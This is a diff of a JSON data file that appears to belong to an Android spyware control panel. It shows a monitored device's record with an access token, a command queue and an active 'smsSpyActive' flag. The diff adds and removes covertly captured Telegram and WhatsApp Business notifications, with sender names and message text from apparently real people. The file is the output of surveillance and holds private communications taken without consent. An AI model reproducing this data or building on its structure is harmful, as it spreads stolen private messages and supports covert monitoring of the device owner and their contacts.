@@ -303,7 +303,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775639209035,
+    "lastSeen": 1775639212141,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -319,6 +319,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "ㅤ ᴀ̈xᴇʟʟ",
+        "content": "Voice message",
+        "time": "08/04 16:06",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775639213908
+      },
+      {
+        "appName": "WA Business",
+        "sender": "JB || KHAFA X NAZRIEL",
+        "content": "‎6 pesan baru",
+        "time": "08/04 16:06",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775639210584
+      },
+      {
+        "appName": "WA Business",
+        "sender": "‎JB || KHAFA X NAZRIEL (6 pesan): ~ Khafa Store",
+        "content": "gua gk bsa msuk tdi ke gb ini",
+        "time": "08/04 16:06",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775639210575
+      },
       {
         "appName": "Telegram",
         "sender": "ㅤ ᴀ̈xᴇʟʟ",
@@ -4294,30 +4318,6 @@
         "time": "08/04 15:17",
         "pkg": "org.telegram.messenger.web",
         "receivedAt": 1775636262106
-      },
-      {
-        "appName": "Telegram",
-        "sender": "STORE Reski",
-        "content": "JDI? BELIK YANG MN?",
-        "time": "08/04 15:17",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775636257445
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
-        "content": "Voice message",
-        "time": "08/04 15:17",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775636257333
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ALL BUYYER GOJO HARIAN: 𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "Send id tele lu",
-        "time": "08/04 15:17",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775636257287
       }
     ],
     "galleryPhotos": [],
